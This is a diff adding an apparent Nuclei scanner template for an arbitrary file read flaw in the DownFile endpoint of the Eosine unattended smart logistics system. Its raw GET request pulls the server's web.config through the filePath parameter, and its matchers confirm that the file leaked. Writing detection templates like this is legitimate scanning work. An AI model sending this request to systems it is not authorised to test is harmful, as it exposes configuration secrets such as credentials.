@@ -1,0 +1,25 @@
+id: eosine-downfille-fileread
+
+info:
+  name: 易思无人值守智能物流系统 DownFile 任意文件读取漏洞
+  author: qwtd
+  severity: high
+  description: |-
+    易思无人值守智能物流系统是一款集成了人工智能、机器人技术和物联网技术的创新产品。易思智能物流无人值守系统DownFile任意文件读取漏洞。
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E6%98%93%E6%80%9D%E6%99%BA%E8%83%BD%E7%89%A9%E6%B5%81%E6%97%A0%E4%BA%BA%E5%80%BC%E5%AE%88%E7%B3%BB%E7%BB%9F/%E6%98%93%E6%80%9D%E6%99%BA%E8%83%BD%E7%89%A9%E6%B5%81%E6%97%A0%E4%BA%BA%E5%80%BC%E5%AE%88%E7%B3%BB%E7%BB%9FDownFile%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
+  tags: 易思无人值守智能物流系统
+
+http:
+  - raw:
+      - |
+        GET /PublicInfoManage/Upload/DownFile?filePath=web.config HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code==200"
+          - "contains(body, 'configuration')"
+          - "contains(body, 'configSections')"
+        condition: and
